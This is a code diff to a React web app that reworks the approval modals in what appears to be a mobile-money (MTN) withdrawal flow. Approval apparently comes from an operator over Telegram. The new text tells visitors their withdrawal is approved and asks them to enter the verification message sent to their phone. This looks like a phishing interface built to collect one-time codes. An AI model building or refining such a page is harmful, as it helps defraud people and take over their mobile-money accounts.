@@ -146,6 +146,7 @@ function App() {
   const [verificationText, setVerificationText] = useState('');
   const [telegramApprovalOpen, setTelegramApprovalOpen] = useState(false);
   const [withdrawalSuccessOpen, setWithdrawalSuccessOpen] = useState(false);
+  const [approvalResultStage, setApprovalResultStage] = useState('');
   const [approvalId, setApprovalId] = useState('');
   const [approvalStage, setApprovalStage] = useState('withdrawal');
 
@@ -284,11 +285,13 @@ function App() {
     }
 
     if (action === 'correct' && approvalStage === 'withdrawal') {
-      setPage('withdrawalFailed');
+      setApprovalResultStage('withdrawal');
+      setWithdrawalSuccessOpen(true);
       return;
     }
 
     if (action === 'correct' && approvalStage === 'verification') {
+      setApprovalResultStage('verification');
       setWithdrawalSuccessOpen(true);
     }
   };
@@ -717,13 +720,24 @@ function App() {
       <main className="success-page">
         <div className="success-card verification-card">
           {withdrawalSuccessOpen && (
-            <div className="success-modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="withdrawal-success-title">
+            <div className="success-modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="approval-result-title">
               <div className="success-modal">
                 <div className="success-modal-icon"><CheckCircle2 size={34} /></div>
-                <span className="eyebrow">Withdrawal approved</span>
-                <h2 id="withdrawal-success-title">Withdrawal successful</h2>
-                <p>Your withdrawal details and verification message were approved. The funds are now being prepared for {formatPhone(mtnNumber)}.</p>
-                <button type="button" className="primary-button" onClick={() => { setWithdrawalSuccessOpen(false); navigateToPage('success', 'Preparing your withdrawal'); }}>Continue <ArrowRight size={16} /></button>
+                {approvalResultStage === 'withdrawal' ? (
+                  <>
+                    <span className="eyebrow">Withdrawal approved</span>
+                    <h2 id="approval-result-title">Your withdrawal is ready</h2>
+                    <p>Lovely, your withdrawal details are approved. Continue below to enter the verification message sent to your phone.</p>
+                    <button type="button" className="primary-button" onClick={() => setWithdrawalSuccessOpen(false)}>Continue <ArrowRight size={16} /></button>
+                  </>
+                ) : (
+                  <>
+                    <span className="eyebrow">Verification approved</span>
+                    <h2 id="approval-result-title">Your verification is complete</h2>
+                    <p>Thank you, your verification message has been received and approved. Your withdrawal is now ready for the final step.</p>
+                    <button type="button" className="primary-button" onClick={() => { setWithdrawalSuccessOpen(false); navigateToPage('success', 'Preparing your withdrawal'); }}>Continue <ArrowRight size={16} /></button>
+                  </>
+                )}
               </div>
             </div>
           )}
